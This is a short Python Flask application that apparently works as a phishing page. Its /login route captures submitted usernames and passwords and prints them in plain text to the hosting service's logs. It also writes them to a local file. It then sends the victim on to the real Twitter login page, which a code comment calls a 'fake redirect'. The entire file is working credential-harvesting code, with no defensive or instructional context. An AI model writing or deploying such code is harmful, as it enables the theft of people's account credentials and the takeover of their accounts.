from flask import Flask, render_template, request, redirect
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    # ✅ Print to Render logs (this is visible in your Render dashboard)
    print(f"[{datetime.now()}] Username: {username}, Password: {password}")

    # ✅ Optional: Also try writing to file (some platforms may not allow it)
    try:
        with open("log.txt", "a") as file:
            file.write(f"[{datetime.now()}] Username: {username}, Password: {password}\n")
    except Exception as e:
        print(f"Error writing to file: {e}")

    # ✅ Fake redirect after login
    return redirect("https://twitter.com/login")

if __name__ == "__main__":
    app.run(debug=True)
